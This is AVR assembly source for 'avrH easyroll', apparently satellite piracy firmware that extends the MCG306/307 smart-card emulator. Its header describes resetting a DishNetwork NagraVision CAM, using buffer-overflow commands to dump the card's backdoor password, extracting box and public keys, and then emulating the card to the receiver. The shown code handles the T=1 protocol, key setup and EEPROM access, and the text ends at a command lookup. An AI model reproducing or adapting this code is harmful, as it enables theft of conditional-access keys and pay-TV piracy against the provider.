; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *h0rhay* CHANGES START [1/7]
;
; avrH easyroll.  http://www.terra.es/personal6/h0rhay          h0rhay@terra.es
; =============================================================================================================
;
; WHAT DOES THIS DO?
; ------------------
;
; When your insert your AVR3/Blocker board into your IRD this code powers up, sucks the keys out of your
; CAM, and writes them to the Atmel's EEP.  After that it is basic stock MCG306 code.
;
; =============================================================================================================
; avrH 1.0 - Basic functionality
; avrH 1.1 - Improved response checking to the backdoor login and read commands aborts if LEN is wrong.
; avrH 1.2 - I must be on some serious crack.  I hope none of you saw the sloppy code left in 1.1!!!
;            Nothing that would loop your CAM or anything, just poor/inefficient code. :(
;
; avrH 1.3 - Now working on AVR3's with very simple modification to the board.
;
; avrH 1.4 - Properly detects whether to use Key0/1 for Dish -OR- Aux0/1 for X.
;            Blocker boards fully supported again.
;            Only writes CAM Key0 when needed ie: Subbed married and Subbed not-married.
;
; avrH 1.5 - NEW:  *AUTO_CONFIG*.  Now even a newbie can make this work!
;
;            Reads the ATR from the CAM.  Decides whether it's ROM2, ROM3 or OTHER.
;
;            *********** If it's not ROM2 or ROM3 then it aborts. ***********
;
;            Some people still don't understand that part. :(
;
;            If we're on ROM2/3 then we get the CAMID from the card.
;            If the CAMID matches the ID we already have in our EEP then
;            read the keys and fire up MCG306 (same as we did in version 1.4)
;
;            If the CAMID is different, then use the appropriate buffer overflow command
;            to upload code to the CAM and dump the backdoor login password.
;
;            Next use the backdoor login password, to login and read all the information about
;            our setup like ird no, box key, network, tz, zip, etc. directly from the CAM!
;
;            Special Thanks to:  WatchDish for supplying the basic overflow commands I modified.
;
;          - NEW:  *ERROR_MESSAGES*  Should something go wrong, your AVR's ZIP code will be changed
;                                    as follows. (I NEVER attempt change your CAMs contents!)
;
;            1  =  Unable to get an ATR from your CAM.  Is it looped?  Is it inserted?
;            2  =  Unable to use CMD $12 to read the CAMID.  Is your CAM made by NagraVision?
;            3  =  ATR from CAM reports ROM version other than ROM2 or ROM3.  Use ROM2/3 ONLY!!
;            4  =  Either the backdoor login password is wrong or the backdoor has been closed.
;            5  =  Problems using the read setup command to initalize the EEP pointer to $E000.
;            6  =  Cannot read EEP address $E030 to determine the start of data items.
;            7  =  Cannot read EEP data item $01 IRD INFO.
;            8  =  CAM is not from DishNetwork or that *Other* provider. ;)
;            9  =  Unable to read the IRD BOX key from the CAM.
;           10  =  Problems locating Data Item $06 (Programming Provider Info)
;
;           11  =  CAM ALREADY CONFIGURED:  Problems using backdoor password to login.
;           12  =  CAM ALREADY CONFIGURED:  Problems initalizing EEP pointer to $E000.
;           13  =  CAM ALREADY CONFIGURED:  Problems reading new public Key 0 / 1.
;
; avrH 1.51 - Updated the core from MCG306 to the newly released MCG307.
;
; *h0rhay* CHANGES  END  [1/7]
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
;
; Unofficial disassembly of MCG307.
;
; Made by comparing the source from MCG306 with a disassembly of the HEX and EEP from MCG307.
; It will compile to produce perfect copies of MCG307.HEX and MCG307.EEP
; Took me 4 hours to reverse engineer this.  
;
; h0rhay. 3 Dec 2k+1.
;
; ----------------------------------------------------------------------------------------------------
; ----------------------------------------------------------------------------------------------------
;
; Disassembly of MCG306, thanks to the MCG group for creating this great software and coming out with
; a Nag 104 fix so quickly.  Differences between 305 & 306 are noted but are minimal.  Only change
; was to add Command 0/1 signature checking for status flag processing and adding the signatures to the EEProm
;
; Hopefully this will be used to further everbody's understanding of the IRD to CAM communications.
;
; A big thanks to StuntGuy for most of the en/decryption documentation 
; and for his great FAQ on the communications protocol.
;
; Also thanks to that anonomyous fella who wishes to remain so - you know who you are.
;
; This file is provided for educational purposes only - but please don't sell anything containing this code.
; The MCG group went to a lot of work and trouble to write this software and were great in their support
; during the lastest ECMs.  So learn from this, write something great, and then give it away.
; 
; Bull62 04/04/01
;

  .include "c:\progra~1\atmel\avrstu~1\appnotes\8515def.inc"
		   
   .def SID  =  R1	; System ID
   .def NAD  =  R2	; Network Address (0x21 from IRD, 0x12 from card, 0x31 from PC)
   .def PCB  =  R3	; Procedure Control Block
   .def LEN  =  R4	; Message length
   .def LRC  =  R5	; Message Checksum



;  The T=1 protocol has a very specific format for the data packets.  The
;first 3 bytes of the packet, as well as the last byte (or the last two bytes
;if CRC checking is used) of the packet are defined specifically as follows:
;
;  Byte 1: Node address byte (NAD)
;  Byte 2: Procedure control byte (PCB)
;  Byte 3: Length byte (LEN)
;  Last byte: Checksum (LRC)
;
;  Thus, an ISO-7816 compliant T=1 message looks like this:
;
;  NAD PCB LEN <information field> LRC
;
;For data being transferred from the IRD to the CAM, the information field
;(not including the checksum) will always look like this:
;
;  A0 CA 00 00 CL CN DL <data0..dataDL-1> RL
;  |____ ____|  |  |  |                |   |_ Expected length of response
;       |       |  |  |                |_____ Command data...total of DL bytes
;       |       |  |  |                        will be sent, including RL
;       |       |  |  |______________________ Command Data length
;       |       |  |_________________________ Command Number
;       |       |____________________________ Command Length.  Note that this
;       |                                      is essentially the ISO-7816 T=0
;       |                                      "P3" (or length) byte.
;       |____________________________________ Header: Always A0 CA 00 00.  Note
;                                              that these are essentially the
;                                              ISO-7816 T=0 "CLA INS P1 P2"
;                                              bytes.
;
;  Note that there are two length bytes.  Command Length (CL) and command Data
;Length (DL).  In actual practice, DL should always be equal to CL minus 2,
;since CL counts the Command Number (CN) and the command Data Length byte (DL)
;in its total.
;

;  Bit-by-bit breakdown of CAM status flags bytes:
;
;  Bit  Flags 1                Flags 2                Flags 3
;  ---  ---------------------  ---------------------  ------------------------
;   0   CAM suggests $C1 cmd   CAM suggests $02 cmd   Cmd $03 in progress
;   1   CAM has been reset     Cmd 00/01 received     Encrypted ECM data ready
;   2   CAM suggests $31 cmd   Cmd 00/01 complete     Cleartext ECM data ready
;   3   CAM suggests $30 cmd   Cmd $30 in progress    ECM decrypt failed
;   4                          Cmd $31 data ready
;   5                          Cmd $60 allowed        Cmd $02 in progress
;   6                                                 Cmd $02 complete
;   7                                                 Cmd $02 failed;
;
;  The following list details the bit definitions in plain english:
;
;  Bit  Flags 1                 Flags 2                 Flags 3
;  ---  ---------------------   ---------------------   -----------------------
;   0   Database updated        CAM requests MECM data  ECM being processed
;   1   CAM has been reset      EMM being processed     Even control word ready
;   2   Memory full             EMM processing done     Odd control word ready
;   3   Credit low              CC being processed      ECM decrypt failed
;   4                           CC processing done                         
;   5                           IRD command waiting     MECM being processed
;   6                                                   MECM data ready
;   7   CAM tamper detected                             MECM decrypt failed
;
;  Notes: CC="Callback", flags 1 bit 4 and flags 2 bits 6+7 not supported by
;current EchoStar IRDs.
;
;
; PC to AVR3 Setup Messages
;
; Formated as
; NAD CMD CmdLen Data[0..CmdLen] LRC
;
; NAD is always 0x31, note IRD to AVR is 0x21
; CMD  0 = Write to EEPROM
;      1 = Read from EEPROM
;      2 = Password protected Write to EEPROM
;
; CMD 0: 0x31 0x00 CmdLen AddrHH AddrLL DataLen Data[1..DataLen] LRC
;        AddrHH = high byte of EEPROM address
;        AddrLL = low byte of EEPROM address
;        DataLen = number of bytes to write
;        Data = Data bytes 1 thru Datalen
;   Returns: a good response, 
;
; CMD 1: 0x31 0x01 0x03 AddrHH AddrLL DataLen LRC
;        AddrHH = high byte of EEPROM address
;        AddrLL = low byte of EEPROM address
;        DataLen = number of bytes to read
;
;   Returns: Data read from EEPROM
;
; CMD 2: 0x31 0x02 CmdLen Password[1..8] AddrHH AddrLL DataLen Data[1..DataLen] LRC
;        CmdLen = 11 + DataLen
;        Password = 8 byte password
;        Rest of command is same as CMD 0, write EEPROM
;        This command is used to unlock the password in AVR by sending the current password and the write data is 
;          a write to the EEPROM password with all bytes = 0xFF.  This disables password checking for any
;          further reads/write.
;
; Note: If the AVR receives any messages with a NAD other than 0x31, any further use of these messages are disabled.
;       The AVR must be reset before they are re-enabled.
;    


; Processor	  : AVR	    
; Target assembler: AVR	Assembler

; ЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭ

; Segment type:	Pure code
.CSEG ;	ROM
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *h0rhay* CHANGES START [2/7]

		rjmp	h0rhay		; Reset (code was rjmp Ext_Rst)

; *h0rhay* CHANGES  END  [2/7]
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *****************************************************************************************
; MCG307 CHANGED FROM #1
; *****************************************************************************************
;		rjmp	Ext_RST	; Reset
; *****************************************************************************************
; MCG307 CHANGED TO   #1
; *****************************************************************************************
		reti			; External Int 0
; *****************************************************************************************
; MCG307 END CHANGES  #1
; *****************************************************************************************
		rjmp	Ext_Int	; External Int 1 - ISO7816 Reset line
		reti			; Timer	1 Capture
		reti			; Timer	1 Compare A
		reti			; Timer	1 Compare B
		reti			; Timer	1 Overflow
		reti			; Timer	0 Overflow
		reti			; SPI complete
		reti			; UART,	Rx complete
		reti			; UART,	Data Register Empty
		reti			; UART,	Tx complete
		reti			; Analog Comparator
		
;-------------------------------------------------------------------------------------------------------------------

Ext_RST:				; ...
		sbi	ACSR, 7		; Turn off ADC
		cli
		clr	r16
		out	GIMSK, r16	; Disable INT 0	& 1
		out	MCUCR, r16	; No Extern SRAM, Low level on INT 0&1 generates interrupt
					; ;
					; ;  clear out ram.  Set it all	to zeros.  Clear
					; ;  starting at $60 thru $260.
					; ;
		ldi	YH, high(sRamstart)
		ldi	YL, low(sRAMstart)

CLEAR_RAM:				; ...
		st	Y+, r16
		cpi	YL, low(RAMEND+1)
		brcs	CLEAR_RAM
		cpi	YH, high(RAMEND+1)
		brcs	CLEAR_RAM
;
;  Setup I/O PORTD
;  Pin 0 = IRD Rx/Tx
;  Pin 3 = Int 1 - ISO Pad Reset line, ie "IRD resets CAM"
;  Pin 4 = CAM Rx/Tx
;
		ldi	r16, 0xDD
		out	PORTD, r16	; Pin 1	& 5 zero, others high
		ldi	r16, 0x20
		out	DDRD, r16	; Pin 1	is output, others inputs
;
; Setup port B, PB5=MOSI, PB6=MISO; PB7=SCK
;
		ldi	r16, 0xF0
		out	DDRB, r16	; Pins 7-4 outputs, others inputs
		ldi	r16, 0xF
		out	PORTB, r16
;
; Set stack
;
		ldi	r16, low(sStack)
		out	SPL, r16
		ldi	r16, high(sStack)
		out	SPH, r16


		ldi	XH, high(eFSID1)
		ldi	XL, low(eFSID1)
		rcall	ReadEEP		; Read EEPROM 0x0001 (eFSID1)
		cpi	r16, 0		; is this DISH?
		brne	Start_NotDish	; jump if not
		ori	r16, 1
		rjmp	StartFID

Start_NotDish:				; ...
		andi	r16, 0xFE	; clear	bit 0

StartFID:				; ...
		andi	r16, 1		; Isolate bit 0
		mov	SID, r16	; R1 = Fake system ID

		ldi	XH, high(eEnabler)
		ldi	XL, low(eEnabler)
		rcall	ReadEEP		; X = 0x00CF (eEnabler)

		or	SID, r16	; Combine Enabler type & System	type
		rcall	PrepPubKeys
		rjmp	PrepKeys


PrepPubKeys:				; ...
		ldi	XH, high(eAuxKey0)
		ldi	XL, low(eAuxKey0) ; X = 0x00D0 (eAuxKey0)
		sbrc	SID, 0		; skip next if not Dish
		adiw	XL, (ePubKey0-eAuxKey0)	; becomes 0xE0 (ePubKey0)
		rcall	LoadKey
		rcall	DeCrypt_Init


		ldi	XH, high(sDKey0)
		ldi	XL, low(sDKey0) ; X = 0x014D (sDKey0)
		rcall	SaveKeyRegs


		ldi	XH, high(eAuxKey1)
		ldi	XL, low(eAuxKey1) ; X = 0x00D8 (eAuxKey1)
		sbrc	SID, 0		; skip next if not Dish
		adiw	XL, (ePubKey1-eAuxKey1)	; becomes 0xF0 (ePubKey1)
		rcall	LoadKey
		rcall	DeCrypt_Init


		ldi	XH, high(sDKey1)
		ldi	XL, low(sDKey1) ; X	= 0x0156 (sDKey1)
		rcall	SaveKeyRegs


		ret
; End of function PrepPubKeys

;-------------------------------------------------------------------------------------------------------------------

PrepKeys:				; ...
		ldi	XH, high(eBoxKey)
		ldi	XL, low(eBoxKey) ; X	= 0x00F8 (eBoxKey)
		rcall	LoadKey
		rcall	EnCrypt_Init
		ldi	XH, high(sEBoxKey)
		ldi	XL, low(sEBoxKey) ; X = 01044 (sEBoxKey)
		rcall	SaveKeyRegs

		ldi	XH, high(eCAMBox)
		ldi	XL, low(eCAMBox) ; X	= 0x0108 (eCAMBox)
		rcall	LoadKey
		rcall	DeCrypt_Init
		ldi	XH, high(sDCAMbox)
		ldi	XL, low(sDCAMbox) ; X = 0x0160 (sDCAMbox)
		rcall	SaveKeyRegs

		ldi	XH, high(eCAMPub)
		ldi	XL, low(eCAMPub) ; X	= 0x0100 (eCAMPub)
		rcall	LoadKey
		rcall	EnCrypt_Init
		ldi	XH, high(sECAMPub)
		ldi	XL, low(sECAMPub) ; X = 0x016A (sECAMPub)
		rcall	SaveKeyRegs
;
;-------------------------------------------------------------------------------------------------------------------
;
; External Int - We get	here when the ISO reset	line is	activated (active low)


Ext_Int:				; ...
		ldi	r16, low(sStack) ; Set stack to 0x006F
		out	SPL, r16
		ldi	r16, high(sStack)
		out	SPH, r16

; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *h0rhay* CHANGES START [3/7]

		sbrc	SID, 7		; 1=AVR3, 0=Blocker board (skip if Blocker)
		cbi	PORTD,5		; AVR3: Make the line LOW. (resetting the CAM)
		sbrs	SID,7			; 1=AVR3, 0=Blocker board (skip if AVR3)
		sbi	PORTD,5		; Blocker: Connect IRD RESET to CAM RESET (resetting the CAM)

; *h0rhay* CHANGES  END  [3/7]
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*

RstLow:					; ...
		sbis	PIND, 3		; Wait for reset to go high
		rjmp	RstLow

; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *h0rhay* CHANGES START [4/7]

		sbrc	SID, 7		; (2/1) 1=AVR3, 0=Blocker board (skip if Blocker)
		sbi	PORTD,5		; (2/0) AVR3: Make the line HIGH. (let CAM run)
		sbrs	SID,7			; (1/2) 1=AVR3, 0=Blocker board (skip if AVR3)
		cbi	PORTD,5		; (0/2) Blocker: Disconnect IRD RESET from CAM RESET (let CAM run)

; I added 5 clocks that weren't in the original MCG306.  So I have to adjust the delay loop
; below to get things back in time!  Since the delay loop gives d=3+3*R25 cycles we better
; reduce the R25 value by 2 for a total of a 6 clock reduction and then add another NOP here to
; bring our total added up to 6 as well.

		nop

; *h0rhay* CHANGES  END  [4/7]
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*

; *****************************************************************************************
; MCG307 START CHANGES #2 *****************************************************************
; *****************************************************************************************
		rjmp loc_10

		ldi	ZH, high(BigTable * 2)
		ldi	ZL, low(BigTable * 2)
		ldi	YH, high(sMB_10)	; Y -> signature bytes in msg
		ldi	YL, low(sMB_10)
		ldi	r18,8

loc_9:	lpm
		adiw	ZL,1
		st	y+,r0
		dec	r18
		brne	loc_9
		rjmp	loc_57

loc_10:
; *****************************************************************************************
; MCG307 END CHANGES  #2
; *****************************************************************************************
		cli

; *****************************************************************************************
; MCG307 CHANGED FROM #3
; *****************************************************************************************
;		ldi	r16, 0xC0
; *****************************************************************************************
; MCG307 CHANGED TO   #3
; *****************************************************************************************
		ldi	r16, 0x80
; *****************************************************************************************
; MCG307 END CHANGES  #3
; *****************************************************************************************

		out	GIMSK, r16	; Int 0	& 1 enabled
		sei

; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*
; *h0rhay* CHANGES START [5/7]
;
; Was 32.

		ldi	r25, 30		; 93 clocks (was #32 for 99 but I added 6 clocks above)

; *h0rhay* CHANGES  END  [5/7]
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*

		rcall	Delay

		ldi	ZL, low(ATR_data * 2)
		ldi	ZH, high(ATR_data * 2)	; Z = 0x121E (Flash 0x90F x 2)	ATR in FLASH
					; 
		ldi	r18, 27		; ATR is 27 bytes long

SendATRLp:				; ...
		lpm			; Get byte of ATR in R0

		adiw	ZL, 1		; Inc Z
		mov	r16, r0
		rcall	TX_ATR
		brne	SendATRLp


		ldi	r16, 3		; status = 03
		sts	Stat1, r16


		ldi	r16, 0xCF	; flags	= CF FF
		sts	sC21_flag1, r16
		ser	r16
		sts	sC21_flag2, r16	; 0xFF

MainLoop:				; ...
		ldi	r16, low(sStack) ; Set stack to 0x006F
		out	SPL, r16
		ldi	r16, high(sStack)
		out	SPH, r16


		rcall	RX_IRD
		mov	NAD, r16	; NAD
		rcall	RX_IRD
		mov	PCB, r16	; PCB
		rcall	RX_IRD
		mov	LEN, r16	; LEN
		tst	LEN		; zero len message ?
		breq	ReadCkSum


		mov	r18, LEN
		rcall	InitYbuf

ReadMsg:				; ...
		rcall	RX_IRD		; read byte of message
		st	Y, r16		; store	in msgbuf
		sbrs	PCB, 7		; control request ?
		adiw	YL, 1		; inc Y
		dec	r18		; dec count
		brne	ReadMsg		; read all of message bytes

ReadCkSum:				; ...
		rcall	RX_IRD		; read checksum	byte
		mov	LRC, r16	; compute checksum in R5
		tst	LEN		; zero len message?
		breq	CkSumHdr
		sbrs	PCB, 7		; are we a blocker or AVR3 ?
		rjmp	CkSumMsg
		lds	r16, sMsgBuf	; load 1st byte	of buffer (sMsgBuf)
		eor	LRC, r16	; calc cksum
		rjmp	CkSumHdr
;-------------------------------------------------------------------------------------------------------------------

CkSumMsg:				; ...
		mov	r18, LEN	; count	= LEN
		rcall	InitYbuf

CkSumLp:				; ...
		ld	r16, Y+		; load msg byte
		eor	LRC, r16	; checksum byte
		dec	r18		; dec count
		brne	CkSumLp

CkSumHdr:				; ...
		eor	LRC, NAD	; checksum NAD
		eor	LRC, PCB	; checksum PCB
		eor	LRC, LEN	; checksum LEN
		tst	LRC		; checksum should = 0
		breq	CkSumGood


		rjmp	Send_ErrCksm
;-------------------------------------------------------------------------------------------------------------------

CkSumGood:				; ...
		mov	r16, NAD	; NAD
		cpi	r16, 0x31	; PC = 0x31, IRD = 0x21
		brne	notPCmsg


		sbrc	SID, 6		; R1 bit 6 (0x40) set after received at	least one IRD msg
		rjmp	IRDmsg


		ldi	r18, 8		; password is 8	bytes
		ldi	XH, high(ePassWrd)
		ldi	XL, low(ePassWrd) ; Y = 0x00E0 (ePassWrd)

isPWDset:				; ...
		rcall	ReadEEP
		cpi	r16, 0xFF	; has password been set	?
		brne	isPWDcmd
		dec	r18
		tst	r18
		brne	isPWDset	; check	the password


		mov	r16, PCB	; command = PCB

		cpi	r16, 0		; cmd =	 Write EEPROM ?
		breq	PCwriteEEP
		cpi	r16, 1		; cmd =	Read EEPROM ?
		breq	PCreadEEP

isPWDcmd:				; ...
		mov	r16, PCB
		cpi	r16, 2		; cmd =	Protected write	to EEPROM ?
		breq	PCpwdWrite


		rjmp	BadCmd
;-------------------------------------------------------------------------------------------------------------------

notPCmsg:				; ...
		rjmp	IRDmsg
;-------------------------------------------------------------------------------------------------------------------

PwdBad:					; ...
		rjmp	BadCmd
;-------------------------------------------------------------------------------------------------------------------

PCwriteEEP:				; ...
		rcall	InitYbuf
		ld	XH, Y+
		ld	XL, Y+		; X = addrHH:addrLL from msg buff
		ld	r18, Y+		; data len

PCwLp:					; ...
		ld	r16, Y+		; data[n] from msgbuf
		rcall	WriteEEP	; write	data
		dec	r18		; dec count
		tst	r18
		brne	PCwLp		; write	all the	bytes from msgbuf


		rjmp	Send9000
;-------------------------------------------------------------------------------------------------------------------

PCreadEEP:				; ...
		rcall	InitYbuf
		ld	XH, Y+
		ld	XL, Y+		; X = addrHH:addrLL from msg buff
		ld	r18, Y+		; data len
		add	LEN, r18	; add data len to returned cmd len

PCrLP:					; ...
		rcall	ReadEEP		; read data
		st	Y+, r16		; save in msgbuff after	the read command header
		dec	r18		; dec count

		tst	r18

		brne	PCrLP		; read all the bytes into msgbuff

		rjmp	Send9000
;-------------------------------------------------------------------------------------------------------------------

PCpwdWrite:				; ...
		rcall	InitYbuf	; Y = msgbuf, 8	bytes of password

		ldi	XH, high(ePassWrd)
		ldi	XL, low(ePassWrd) ; X = 0x00E0 (ePassWrd)
		ldi	r18, 8		; compare 8 bytes

PCpwdCmp:				; ...
		rcall	ReadEEP
		ld	r17, Y+		; load from msgbuf

		cp	r17, r16	; does password	match so far ?
		brne	PwdBad		; jump if passwords don't match
		dec	r18		; dec count
		tst	r18
		brne	PCpwdCmp


		ld	XH, Y+		; X = addrHH:addrLL from msgbuf
		ld	XL, Y+
		ld	r18, Y+		; Data len from	msgbuf

PCpwdLp:				; ...
		ld	r16, Y+		; load byte from msgbuf
		rcall	WriteEEP	; write	byte
		dec	r18		; dec count
		tst	r18
		brne	PCpwdLp		; write	all the	bytes from msgbuf


		rjmp	Send9000
		
;-------------------------------------------------------------------------------------------------------------------
;
;
; We get here when IRD sends a message with a valid checksum

IRDmsg:					; ...
		mov	r16, SID	; get Sys flags
		ori	r16, 0x40	; set bit 6 = we've received an IRD message
		mov	SID, r16	; save Sys flags


		sbrs	PCB, 7		; If PCB is a control request
		rjmp	IRD_InstBlk	; Else deal with standard message


		sbrs	PCB, 6		; if set then control request
		rjmp	IRD_CtrlResp

; Control Request
		mov	r16, PCB	; PCB
		cpi	r16, 0xC0	; 0xC0 = resync

		breq	CReq_Reset

 ; C1 = IFS (Information	Field Size) ie.	reset buffer size to LEN
		cpi	r16, 0xC1
		breq	CReq_IFS

		cpi	r16, 0xE1
		breq	CReq_IFSresp

		cpi	r16, 0xC2	; C2 = Abort
		breq	CReq_Reset

CReq_IFSresp:				; ...
		rjmp	Send_ErrUnk
		
;-------------------------------------------------------------------------------------------------------------------

CReq_Reset:				; ...
		ori	r16, 0x20	; set Response bit in PCB
		mov	r15, LEN	; LEN
		rjmp	Send_Reply	; echo back what IRD sent
		
;-------------------------------------------------------------------------------------------------------------------

CReq_IFS:				; ...
		mov	r16, LEN	; LEN of msgbuf
		cpi	r16, 1		; must be a 1 byte message
		brne	Send_ErrUnk	; if not then unknown error


		lds	r16, sMsgBuf	; get requested	new max	LEN
		tst	r16

		breq	Send_ErrUnk	; can't have a zero len buffer

		ldi	r16, 1
		mov	r18, r16	; response LEN is 1
		ldi	r16, 0xE1	; set "IFS change response" PCB
		rjmp	Send_Reply	; echo back what IRD sent
		
;-------------------------------------------------------------------------------------------------------------------

IRD_CtrlResp:				; ...
		rjmp	Respond		; Control response block, PCB =	10xxxxxxb
		
;-------------------------------------------------------------------------------------------------------------------

IRD_InstBlk:				; ...
		ldi	r16, 0		; Instruction block (normal command), PCB = 0xxxxxxxb
		sts	sTemp, r16	; zero msg number (sMsgNum)
		sbrc	PCB, 5		; is it	a chained message ?
		rcall	RxChained	; it was chained


		tst	LEN		; LEN =	0 ?
		brne	IRD_ckCLA1	; jump if not
		rjmp	Resp_NoMsg	; zero LEN msg
		
;-------------------------------------------------------------------------------------------------------------------

IRD_ckCLA1:				; ...
		lds	r16, sMsgBuf	; (sMsgBuf)
		cpi	r16, 0xD0
		brcs	IRD_ckCLA2	; jump if CLA <	0xD0
		
		cpi	r16, 0xFF
		brcc	IRD_ckCLA2	; jump if CLA >= 0xFF
		
		mov	r16, LEN	; R16 =	LEN
		rjmp	Resp_NoMsg
		
;-------------------------------------------------------------------------------------------------------------------

IRD_ckCLA2:				; ...
		cpi	r16, 0xA0	; IRD CLA always = 0xA0
		brne	IRD_badCLA

		lds	r16, sMB_1
		cpi	r16, 0xCA	; IRD INS is always0xCA
		brne	IRD_badINS
		rjmp	IRD_chkP1P2
		
;-------------------------------------------------------------------------------------------------------------------

IRD_badINS:				; ...
		rjmp	Send_6900
		
;-------------------------------------------------------------------------------------------------------------------

IRD_badCLA:				; ...
		rjmp	Send_SW1x6E
		
;-------------------------------------------------------------------------------------------------------------------

Send_ErrCksm:				; ...
		ldi	r16, 0x81	; PCB =	Parity/LRC error
		rjmp	Send_Hdr
		
;-------------------------------------------------------------------------------------------------------------------

Send_ErrUnk:				; ...
		ldi	r16, 0x82	; PCB =	0x82 ie	Response with Unknown Error

Send_Hdr:				; ...
		clr	r18		; zero len
		sbrc	PCB, 6		; "N" bit set in incoming msg ?
		ori	r16, 0x10	; If so, set "N" bit in response

Send_Reply:				; ...
		mov	LEN, r18	; LEN
		mov	PCB, r16	; PCB

		ldi	r25, 128
		rcall	Delay		; 387 clocks


		rjmp	Respond
		
;-------------------------------------------------------------------------------------------------------------------

RxChained:				; ...
		mov	r16, PCB	; PCB
		andi	r16, 0x40	; next 3 instructions should zero R16 -	not sure why we	do this
		lsr	r16
		lsr	r16
		ori	r16, 0x80	; set PCB to "response block"
		mov	PCB, r16	; save PCB
		ldi	r16, 0x10
		eor	PCB, r16	; Alternate sequence number bit


		swap	NAD		; swap NAB, target <-> source
		lds	r16, sTemp	; total	chained	bytes (sMsgBytes)
		add	r16, LEN
		sts	sTemp, r16


		clr	LEN		; clear	LEN
		clr	LRC		; clear	checksum
		eor	LRC, PCB	; checksum PCB
		eor	LRC, NAD	; checksum NAD
		mov	r16, NAD
		rcall	TX_IRD		; TX NAD
		mov	r16, PCB
		rcall	TX_IRD		; TX PCB
		mov	r16, LEN
		rcall	TX_IRD		; TX LEN
		mov	r16, LRC
		rcall	TX_IRD		; TX checksum


		rcall	RX_IRD
		mov	NAD, r16	; RX NAD
		rcall	RX_IRD
		mov	PCB, r16	; RX PCB
		rcall	RX_IRD
		mov	LEN, r16	; RX LEN
		mov	r18, LEN	; count	= LEN

RxChnMsg:				; ...
		rcall	RX_IRD		; read data byte
		st	Y, r16		; save it
		adiw	YL, 1		; dec count
		dec	r18
		brne	RxChnMsg


		rcall	RX_IRD
		mov	LRC, r16	; checksum


		sbrc	PCB, 5		; More chained messages	?
		rjmp	RxChained	; keep getting it


		lds	r16, sTemp	; total	chained	bytes
		add	LEN, r16	; LEN =	total bytes received
		ret
		
;-------------------------------------------------------------------------------------------------------------------
;*****
;
; Send a message back to the IRD which is the swapped NAD, the received
; PCB, a length	of 0, and an LRC.  This	is an "invalid header" response,
; sent if the LEN byte is 0, or	if the first byte of the information field
; is 0xD0..0xFE.
;
;*****


Resp_NoMsg:				; ...
		clr	LEN
;
;
; Send Response	To IRD.	 On entry to this routine, NAD should contain the
; received NAD,	PCB  and LEN should contain the	PCB and	LEN bytes to send,
; respectively,	and the	message	to be sent should be stored in msgbuf



Respond:				; ...
		swap	NAD		; exchange target & dest in NAD
		mov	LRC, NAD	; start	checksum
		eor	LRC, PCB	; cksum	PCB
		eor	LRC, LEN	; cksum	LEN
		rcall	InitYbuf	; point	Y to msgbuf
		mov	r18, LEN	; count	= LEN

RsCkLp:					; ...
		tst	r18		; is count 0 ?
		breq	RsTxMsg
		ld	r16, Y+		; load data byte from msgbuf
		eor	LRC, r16	; add to checksum
		dec	r18		; dec count
		rjmp	RsCkLp

RsTxMsg:				; ...
		mov	r16, NAD	; send NAD
		rcall	TX_IRD
		mov	r16, PCB	; PCB
		rcall	TX_IRD
		mov	r16, LEN	; LEN
		rcall	TX_IRD


		rcall	InitYbuf	; point	Y to msgbuf

RxTxLp:					; ...
		tst	LEN		; send all of msgbuf ?
		breq	RxTxCk		; jump if msgbuf sent
		ld	r16, Y+		; load byte from msgbuf
		rcall	TX_IRD
		dec	LEN		; dec count
		rjmp	RxTxLp

RxTxCk:					; ...
		mov	r16, LRC	; send checksum
		rcall	TX_IRD


		rjmp	MainLoop
		
;-------------------------------------------------------------------------------------------------------------------
;
; Parse	the command the	IRD has	sent
;
; Info field format:
;
; Addr	 A8 A9   AA  AB  AC    AD   AE    AF   B0   B1   B2
;       CLA INS  P1  P2  CLEN  CMD  DLEN  CD0  CD1  CD2  CD3
;
;
; Check	P1 and P2 from IRD, should always be 0

IRD_chkP1P2:				; ...
		lds	r16, sMB_2	; IRD always sends P1 =	0
		tst	r16
		brne	IRD_badP1P2
		lds	r16, sMB_3	; IRD always sends P2 =	0
		tst	r16
		brne	IRD_badP1P2


		lds	r15, sMB_5	; get the CC (command code) sent from IRD, (sMbCN)
		clr	r18		; clear	index

LookUpCMD:				; ...
		ldi	ZL, low(JMP_INDEX *2)
		ldi	ZH, high(JMP_INDEX *2)	; Z = 0x0344 (JmpIndex x 2)
